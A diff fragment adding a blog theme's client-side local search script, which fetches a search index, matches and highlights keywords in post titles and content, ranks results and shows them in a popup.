+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });</script></body></html>
